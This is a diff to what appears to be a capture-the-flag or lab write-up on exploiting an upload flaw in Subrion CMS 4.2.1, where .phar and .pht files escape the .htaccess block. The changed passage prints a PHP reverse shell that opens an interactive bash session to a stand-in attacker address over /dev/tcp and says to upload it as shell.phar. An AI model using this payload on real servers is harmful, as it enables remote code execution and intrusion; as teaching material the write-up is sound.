@@ -116,15 +116,17 @@ The second way would be to upload a php script from personal files onto the CMS 
 
 **/panel/uploads in Subrion CMS 4.2.1 allows remote attackers to execute arbitrary PHP code via a .pht or .phar file, because the .htaccess file omits these.**
 
-This confirmed my deduction regarding .htaccess block and also gave us a way to create the plant the php code into the uploads directory and afterwards successfully launch it.
+This confirmed my deduction regarding .htaccess block and also gave us a way to create and plant the php code into the uploads directory and afterwards successfully launch it.
 
 Here is what we are going to do:
 
 Create a simple php file with the following code, you can use the following:
 
+```bash
 <?php
 system("bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'");
 ?>
+```
 
 I am going to use my ip plus port 7777 since it is very rarely occupied.
 Name your file something like shell.phar or shell.pht (.phar worked perfectly for me).
